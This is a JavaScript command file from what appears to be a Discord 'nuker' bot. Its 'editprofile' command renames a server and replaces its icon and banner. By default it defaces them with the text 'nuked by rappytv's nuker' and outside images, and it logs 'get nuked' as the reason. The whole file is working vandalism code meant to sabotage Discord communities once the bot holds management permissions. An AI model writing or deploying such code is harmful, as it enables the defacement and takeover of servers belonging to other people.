const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, EmbedBuilder, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `editprofile`,
    options: [
        {
            name: `name`,
            description: `new server name`,
            type: ApplicationCommandOptionType.String,
            required: false
        },
        {
            name: `icon`,
            description: `new server icon (url)`,
            type: ApplicationCommandOptionType.String,
            required: false
        },
        {
            name: `banner`,
            description: `new server banner (url)`,
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageGuild)) return console.log(`[ERROR] I'm missing the permission ManageGuild (1 << 5)! [${interaction.guild.name}]`);
        const oldname = interaction.guild.name;
        interaction.guild.setName(options.getString(`name`) || `nuked by rappytv's nuker`, `get nuked [rappytv's nuker]`)
        .then(() => {
            return console.log(`[PROFILE] Changed guild name ${oldname} -> ${interaction.guild.name} (${interaction.guild.id})`);
        }).catch((err) => {
            return console.log(`[PROFILE] Failed to change name of ${interaction.guild.name} (${interaction.guild.id}): ${err}`);
        });
        interaction.guild.setIcon(options.getString(`icon`) || `https://play-lh.googleusercontent.com/8ddL1kuoNUB5vUvgDVjYY3_6HwQcrg1K2fd_R8soD-e2QYj8fT9cfhfh3G0hnSruLKec`, `get nuked [rappytv's nuker]`)
        .then(() => {
            return console.log(`[PROFILE] Changed guild icon ${oldname} (${interaction.guild.id})`);
        }).catch((err) => {
            return console.log(`[PROFILE] Failed to change icon of ${interaction.guild.name} (${interaction.guild.id}): ${err}`);
        });
        interaction.guild.setBanner(options.getString(`banner`) || `https://cdn.discordapp.com/attachments/1048959321037353090/1067205761450659851/banner.png`, `get nuked [rappytv's nuker]`)
        .then(() => {
            return console.log(`[PROFILE] Changed guild banner ${oldname} (${interaction.guild.id})`);
        }).catch((err) => {
            return console.log(`[PROFILE] Failed to change banner of ${interaction.guild.name} (${interaction.guild.id}): ${err}`);
        });
    }
}